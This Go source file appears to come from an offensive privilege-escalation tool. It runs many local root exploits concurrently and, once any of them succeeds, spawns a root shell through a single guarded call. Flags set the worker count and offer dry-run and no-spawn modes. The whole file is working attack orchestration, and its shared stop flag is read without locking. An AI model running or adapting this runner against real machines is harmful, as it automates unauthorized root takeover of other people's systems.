package main

import (
	"context"
	"flag"
	"runtime"
	"strings"
	"sync"
	"time"
)

// flagJobs controls how many exploits run in parallel.
var flagJobs = flag.Int("jobs", 0, "Parallel exploit workers (default: auto = NumCPU, cap 8)")

// workerCount returns the concurrency level.
func workerCount() int {
	j := *flagJobs
	if j < 1 {
		j = runtime.NumCPU()
	}
	if j > 8 {
		j = 8
	}
	if j < 1 {
		j = 1
	}
	return j
}

// runPool executes a batch of exploits concurrently with a worker pool.
// It returns the moment ANY worker achieves root (context cancellation
// stops all other workers), or when all are done.
//
// stop is set to true if root was achieved.
// shellSpawned is set via the spawnOnce guard.
func runPool(ctx context.Context, s *systemInfo, exploits []Exploit, stop *bool, wg *sync.WaitGroup) {
	jobs := make(chan Exploit)
	n := workerCount()
	if n > len(exploits) {
		n = len(exploits)
	}
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for e := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if *stop {
					return
				}
				runOneConcurrent(ctx, s, e, stop)
			}
		}()
	}
	for _, e := range exploits {
		if *stop {
			break
		}
		select {
		case <-ctx.Done():
			break
		case jobs <- e:
		}
	}
	close(jobs)
}

// runOneConcurrent is the concurrency-safe version of runOne.
func runOneConcurrent(ctx context.Context, s *systemInfo, e Exploit, stop *bool) {
	if e.NoRoot {
		return
	}
	if !e.exists() {
		stepf("%-26s skip (file missing)", e.Name)
		return
	}
	if ok, why := e.eligible(s); !ok {
		if *flagOnlyKern && strings.Contains(why, "kernel") {
			stepf("%-26s skip (%s)", e.Name, why)
			return
		}
		if strings.Contains(why, "missing tools") {
			stepf("%-26s skip (%s)", e.Name, why)
			return
		}
	}
	if *flagDry {
		stepf("%-26s DRY  would run (%s)", e.Name, e.Desc)
		return
	}

	to := e.Timeout
	if to == 0 {
		to = defaultTimeout
	}
	// Cap at 30s in concurrent mode (was 45s) to keep the pool moving.
	if to > 30 && to < 120 {
		to = 30
	}

	stepf("%-26s running... (%s)", e.Name, e.Desc)

	var r runResult
	switch e.Kind {
	case kindBinary:
		argv, _ := e.buildArgv()
		r = runIsolated(e.Name, "", argv, time.Duration(to)*time.Second)
	case kindScript:
		argv, _ := e.buildArgv()
		r = runIsolated(e.Name, "", argv, time.Duration(to)*time.Second)
	case kindCompile:
		r = compileAndRun(e, s)
	case kindDir:
		r = compileAndRun(e, s)
	case kindCopyfail:
		argv, _ := e.buildArgv()
		r = runIsolated(e.Name, "", argv, time.Duration(to)*time.Second)
	}
	r.name = e.Name
	r.report()
	if *flagVerbose {
		printChildOutput(&r)
	}
	if r.rootAfter || r.suidAfter {
		spawnOnce(s, &r, stop)
	}
}

// spawnOnce ensures rootspawn is called exactly once across all workers.
var (
	spawnMu sync.Mutex
	spawned bool
)

func spawnOnce(s *systemInfo, r *runResult, stop *bool) {
	spawnMu.Lock()
	defer spawnMu.Unlock()
	if spawned {
		*stop = true
		return
	}
	if !*flagNoSpawn {
		shellSpawned = rootspawn(r)
	}
	spawned = true
	*stop = true
}
